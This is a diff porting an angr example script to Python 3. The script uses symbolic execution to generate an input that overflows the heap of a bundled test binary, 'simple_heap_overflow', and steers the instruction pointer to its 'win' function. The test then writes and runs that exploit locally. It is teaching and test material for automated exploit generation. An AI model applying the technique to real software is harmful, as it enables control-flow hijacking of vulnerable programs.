@@ -23,7 +23,7 @@ def main():
     # By default, angr will use a sim procedure instead of going through malloc
     # This will tell angr to go ahead and use libc's calloc
     proj = angr.Project("./simple_heap_overflow", exclude_sim_procedures_list=["calloc"],
-            custom_ld_path=os.path.join(DIR, '../../../binaries/tests/x86_64'))
+            ld_path=os.path.join(DIR, '../../../binaries/tests/x86_64'))
 
     # The extra option here is due to a feature not yet in angr for handling
     # underconstraining 0 initialization of certain memory allocations
@@ -37,7 +37,7 @@ def main():
     while sm.active and not sm.unconstrained:
         sm.step()
 
-    print sm
+    print(sm)
     # In [9]: sm
     # Out[9]: <PathGroup with 1 deadended, 1 unconstrained>
 
@@ -50,11 +50,11 @@ def main():
     # win function to give us execution
     s.add_constraints(s.regs.rip == proj.loader.find_symbol('win').rebased_addr)
 
-    print s.solver.constraints
+    print(s.solver.constraints)
     assert s.satisfiable()
 
     # Call the solving engine and write the solution out to a file called "exploit"
-    print "Writing exploit as \"exploit\""
+    print("Writing exploit as \"exploit\"")
     with open('exploit', 'wb') as fp:
         fp.write(s.posix.dumps(0))
 
@@ -62,7 +62,6 @@ def main():
     # ./simple_heap_overflow < exploit
 
 def test():
-
     # Generate the exploit
     main()
 
@@ -74,17 +73,8 @@ def test():
         ,shell=True)
 
     # Assert we got to the printing of Win
-    assert "Win" in out
+    assert b"Win" in out
 
 
 if __name__ == '__main__':
-    main()
-
-    run_result = subprocess.check_output("{0} < {1}".format(
-        os.path.join(DIR,"simple_heap_overflow"),
-        os.path.join(DIR,"exploit"),
-        )
-        ,shell=True)
-
-    # Assert we got to the printing of Win
-    assert "Win" in run_result
+    test()
